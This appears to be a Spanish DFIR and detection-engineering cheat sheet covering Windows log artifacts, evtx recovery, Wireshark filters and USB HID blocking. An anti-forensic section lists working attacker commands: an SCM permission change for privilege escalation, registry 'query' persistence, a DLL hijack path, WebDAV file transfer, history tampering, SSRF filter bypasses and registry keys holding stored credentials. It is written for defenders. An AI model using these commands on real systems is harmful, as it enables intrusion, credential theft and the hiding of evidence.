# DFIR & Detection engineering - Tips
**Digital Forensics Incident Response and Detection engineering**.

Detectar técnicas alternativas y más utilizadas por actores maliciosos para la evisión de sistemas de protección y monitorización. Análisis forense de artefactos comunes y no tan comunes.

## Artefactos - Logs Windows
### Logs de eventos de Windows

| Path | Info | Evidencias |
|------|------|------------|
| `%WINDIR%\System32\config` `%WINDIR%\System32\winevt\Logs` | Contiene los logs de Windows accesibles desde el visor de eventos | Casi todas. Entradas, fechas, accesos, permisos, programas, usuario, etc. |

### Logs Registros varios sobre instalación (Windows)

| Path | Info | Evidencias |
|------|------|------------|
| `%WINDIR%\System32\config` `%WINDIR%\System32\winevt\Logs` | Contiene los logs de Windows accesibles desde el visor de eventos | Casi todas. Entradas, fechas, accesos, permisos, programas, usuario, etc. |
| `%WINDIR%\setupact.log` | Contiene información acerca de las acciones de instalación durante la misma | Podemos ver fechas de instalación, propiedades de programas instalados, rutas de acceso, copias legales, discos de instalación |
| `%WINDIR%\setuperr.log` | Contiene información acerca de los errores de instalación durante la misma | Fallos de programas, rutas de red inaccesibles, rutas a volcados de memoria |
| `%WINDIR%\WindowsUpdate.log` | Registra toda la información de transacción sobre la actualización del sistema y aplicaciones | Tipos de hotfix instalados, fechas de instalación, elementos por actualizar |
| `%WINDIR%\Debug\mrt.log` | Resultados del programa de eliminación de software malintencionado de Windows | Fechas, Versión del motor, firmas y resumen de actividad |
| `%WINDIR%\security\logs\scecomp.old` | Componentes de Windows que no han podido ser instalados | DLL's no registradas, fechas, intentos de escritura,rutas de acceso |
| `%WINDIR%\SoftwareDistribution\ReportingEvents.log` | Contiene eventos relacionados con la actualización | Agentes de instalación, descargas incompletas o finalizadas, fechas, tipos de paquetes, rutas |
| `%WINDIR%\Logs\CBS\CBS.log` | Ficheros pertenecientes a ‘Windows Resource Protection’ y que no se han podido restaurar | Proveedor de almacenamiento, PID de procesos, fechas, rutas |
| `%AppData%\Local\Microsoft\Websetup` (Windows 8) | Contiene detalles de la fase de instalación web de Windows 8 | URLs de acceso, fases de instalación, fechas de creación, paquetes de programas |
| `%AppData%\setupapi.log` | Contiene información de unidades, services pack y hotfixes | Unidades locales y extraibles, programas de instalación, programas instalados, actualizaciones de seguridad, reconocimiento de dispositivos conectados |
| `%WINDIR%\INF\setupapi.dev.log` | Contiene información de unidades Plug and Play y la instalación de drivers | Versión de SO, Kernel, Service Pack, arquitectura, modo de inicio, fechas, rutas, lista de drivers, dispositivos conectados, dispositivos iniciados o parados |
| `%WINDIR%\INF\setupapi.app.log` | Contiene información del registro de instalación de las aplicaciones | Fechas, rutas, sistema operativo, versiones, ficheros, firma digital, dispositivos |
| `%WINDIR%\Performance\Winsat\winsat.log` | Contiene trazas de utilización de la aplicación WINSAT que miden el rendimiento del sistema | Fechas, valores sobre la tarjeta gráfica, CPU, velocidades, puertos USB |

### Artefactos de conexiones de clientes VPN

Revisar posibles artefactos de conexiones de clientes VPN realizadas desde un PC comprometido por un actor malicioso.

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles
```

### ¿Han eliminado el registro de eventos de Windows?

¿Los atacantes eliminaron todos los registros de eventos de Windows?

VSS (Volume Shadow Copy) podría ser una opción pero hay escenarios donde esto también fue eliminado de forma intencionada.

1. Volcado de memoria: https://www.volatilityfoundation.org/releases
2. Montar con MemProcFS: https://github.com/ufrisk/MemProcFS
3. Copiar los archivos evtx:

```ps
Get-ChildItem -Path F:\pid\ -Include *.evtx -Recurse | Copy-Item -Destination .\evtx_files
```

> Volatility - Referencia evtlogs: https://github.com/volatilityfoundation/volatility/wiki/Command-Reference#evtlogs

### Obtener archivos con PID de procesos maliciosos (conexiones SSH Linux)

Se conectaron al sistema a través de SSH e iniciaron procesos maliciosos. Incluso, si eliminaron el historial de comandos.

Esta es una forma de obtener archivos con PID de procesos maliciosos (similar a casos de notty SSH) 

```bash
grep -l SSH_C /proc/*/environ
```

### Filtros Wireshark para analistas

> Referencia: https://www.wireshark.org/docs/dfref/

- Filtrar por dirección IP. Donde "x.x.x.x" es la dirección IP que desea filtrar.
```
ip.addr == x.x.x.x
```

- Filtrar por rango de direcciones IP. Donde "x.x.x.x" e "y.y.y.y" son las direcciones IP inicial y final del rango.
```
ip.addr >= x.x.x.x and ip.addr <= y.y.y.y
```

- Filtrar por interfaz de red. Mostrar sólo los paquetes capturados en la interfaz eth0.
```
interface == eth0
```

- Filtrar por puerto. Donde "80" y "53" son los números de puerto que desees filtrar.
```
tcp.port == 80
udp.port == 53
```

- Filtrar por longitud del paquete. Mostrar sólo los paquetes de más de 100 bytes.
```
frame.len > 100
```

- Filtrar por dirección MAC de origen o destino. Donde "xx:xx:xx:xx:xx:xx" es la dirección MAC origen y destino que desees filtrar.
```
eth.src == xx:xx:xx:xx:xx:xx
eth.dst == xx:xx:xx:xx:xx:xx
```

- Filtrar por código de estado HTTP. Mostrar sólo los paquetes con un código de estado de 200.
```
http.response.status_code == 200
```

- Filtrar por método HTTP. Mostrar sólo los paquetes con método GET. Puede sustituir GET por otros métodos HTTP como POST, PUT, DELETE, etc.
```
http.request.method == GET
```

- Filtrar por URI HTTP. Mostrar sólo los paquetes que tienen un URI que contiene "ejemplo.com". Puede sustituir "ejemplo.com" por cualquier otra cadena URI.
```
http.request.uri contains 'ejemplo.com'
```

- Filtrar por código de respuesta HTTP. Mostrar sólo los paquetes con un código de respuesta 404.
```
http.response.code == 404
```

- Filtrar por cookie HTTP. Mostrar sólo los paquetes que contienen una cookie con el nombre "sessionid".
```
http.cookie contains 'sessionid'
```

- Filtrar por flags TCP. Mostrar sólo los paquetes con la bandera SYN activada. Puede sustituir SYN por cualquier otro indicador TCP, como ACK, RST, FIN, URG o PSH.
```
tcp.flags.syn == 1
```

- Filtrar por tamaño de paquete. Mostrar sólo los paquetes de más de 1000 bytes.
```
frame.len > 1000
```

- Filtrar por nombre de dominio DNS. Mostrar sólo los paquetes DNS que tengan un nombre de dominio que contenga "ejemplo.com", se puede sustituir por cualquier otro nombre de dominio.
```
dns.qry.name contains 'example.com'
```

- Filtrar por tipo de protocolo TLS. Mostrar sólo los paquetes con un tipo de protocolo TLS ClientHello.
```
tls.handshake.type == 1
```


# Bypass SIEM-SOC (Anti-Forensic)

### Comando Windows: net y net1

El comando "net1" funcionará igual que el comando "net".

```cmd
net1 accounts
net accounts
```

### *debugfs* para ejecutar comandos
```bash
df -h
sudo debugfs /dev/sda1
debugfs: ls
debugfs: cat /etc/passwd
... modo interactivo ...
```

### WAF Bypass (SSRF): usar acortamiento IP

| Bloqueo            | Bypass           |
|--------------------|------------------|
| http://10.0.0.1    | http://1.1       |
| http://127.0.0.1   | http://127.1     |
| http://192.168.0.5 | http://192.168.5 |

### Post-Explotación - PrivEsc con scmanager
LPE (Local Privilege Escalation) persistente y sin uso de archivos usando sc.exe otorgando permisos del SCM (Service Control Manager).

- https://learn.microsoft.com/en-us/windows/win32/services/service-control-manager

```cmd
sc.exe sdset scmanager D:(A;;KA;;;WD)
[SC] SetServiceObjectSecurity SUCCESS
```

### Comando history

Las líneas de historial con el sufijo * (asterisco) significa que ha sido modificado. Por ejemplo, usando la tecla hacia arriba (↑), se edita y luego se vuelve a presionar hacia arriba para cambiar a otro comando histórico sin presionar Enter. Cuando se vuelva a ejecutar history se verá que un comando del histórico a sido modificado pero no se sabrá cual fue el comando inicial ejecutado.

```bash
$ sudo bash malware.sh
$ history
    1  clear
    2  sudo bash malware.sh
    3  history
```
Presionar tecla hacia arriba (↑), modificar la cadena de texto, sin pulsar Enter volver cambiar a otro comando pasado pulsando nuevamente la tecla hacia arriba (↑), eliminar y volver ejecutar history para comprobar que el comando inicial no a sido almacenado sino sustituido sin ejecución.
```bash
$ sudo bash software.sh
$ history
    1  clear
    2* bash software.sh
    3  history
```

### DLL Hijacking *cscapi.dll*
Windows Explorer carga automáticamente cscapi.dll que nunca se encuentra. Podría se aprovechada para ejecutar un payload.

- https://twitter.com/D1rkMtr/status/1613568545757220864

```cmd
C:\Windows\cscapi.dll
```

### Otra técnica de ejecución de CMD o PowerShell

Un actor malicioso puede crear en una nueva línea de comandos en Powershell con el comando "query", de forma que pueda generar persistencia en el sistema. Si previamente ejecuta el siguiente comando.
```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Utilities\query" /v pwned /t REG_MULTI_SZ /d 0\01\0pwned\0powershell.exe
```

Al consultar la rama del registro se ejecutará una Powershell.exe.
```cmd
query hacker
```

La detección puede ser complicada si se reemplaza "powershell.exe" por un ejecutable malicioso o tipo [LOLbin](https://lolbas-project.github.io/).

### Uso de *type* para descargar o subir ficheros

1. Alojar un servidor WebDAV con acceso anónimo r/w
2. Download: 
```cmd
type \\webdav-ip\path\file.ext > C:\path\file.ext
```
3. Upload: 
```cmd
type C:\path\file.ext > \\webdav-ip\path\file.ext
```

### Bloquear conexiones USB: Rubber Ducky y Cactus WHID

- HID - Hardware ID 
- VID - Vendor ID
- PID - Product ID

**Rubber Ducky**.
```
HID\VID_03EB&PID_2401&REV_0100
```

**Cactus WHID** (whid-injector).
```
HID\VID_1B4F&PID_9208&REV_0100&MI_02&Col02
HID\VID_1B4F&PID_9208&MI_02&Col02
```

```ps
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Restrictions" -Name 'DenyDeviceIDs' -Value 1 -PropertyType DWord
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Restrictions" -Name 'DenyDeviceIDsRetroactive' -Value 1 -PropertyType DWord

New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Restrictions\DenyDeviceIDs" -Name 'HID\VID_03EB&PID_2401&REV_0100' -Value 1 -PropertyType String
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Restrictions\DenyDeviceIDs" -Name 'HID\VID_1B4F&PID_9208&MI_02&Col02' -Value 1 -PropertyType String
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Restrictions\DenyDeviceIDs" -Name 'HID\VID_1B4F&PID_9208&REV_0100&MI_02&Col02' -Value 1 -PropertyType String
```

### Claves de registro de Windows donde se almacenan las contraseñas

Claves de registro de Windows donde se almacenan las contraseñas del sistema y de herramientas de terceros más comunes, buscadas en fases de Post-Explotación. 

Las claves se ordenan de mayor a menor ocurrencia.
```
KLM\Software\RealVNC\WinVNC4
HKCU\Software\SimonTatham\PuTTY\Sessions
HKCU\Software\ORL\WinVNC3\Password
HKLM\SYSTEM\Current\ControlSet\Services\SNMP
HKCU\Software\Polices\Microsoft\Windows\Installer
HKLM\SYSTEM\CurrentControlSet\Services\SNMP
HKCU\Software\TightVNC\Server
HKCU\Software\OpenSSH\Agent\Keys
HKLM\SYSTEM\CurrentControlSet\Control\LSA
HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential
HKLM\Software\RealVNC\vncserver
HKLM\Software\RealVNC\WinVNC4\Password
HKLM\Software\RealVNC
HKCU\Software\PremiumSoft\Navicat\Servers
HKLM\SYSTEM
HKLM\SAM
HKCU\Software\PremiumSoft\NavicatMONGODB\Servers
HKCU\Software\PremiumSoft\NavicatMSSQL\Servers
HKCU\Software\PremiumSoft\NavicatPG\Servers
HKCU\Software\PremiumSoft\NavicatSQLite\Servers
HKCU\Software\PremiumSoft\NavicatMARIADB\Servers
HKCU\Software\PremiumSoft\NavicatOra\Servers
HKCU\Software\TigerVNC\WinVNC4
```

### Forensia (Anti-Forensic)

Herramienta antiforense para Red Teamers, utilizada para borrar algunas huellas en la fase posterior a la explotación.

- https://github.com/PaulNorman01/Forensia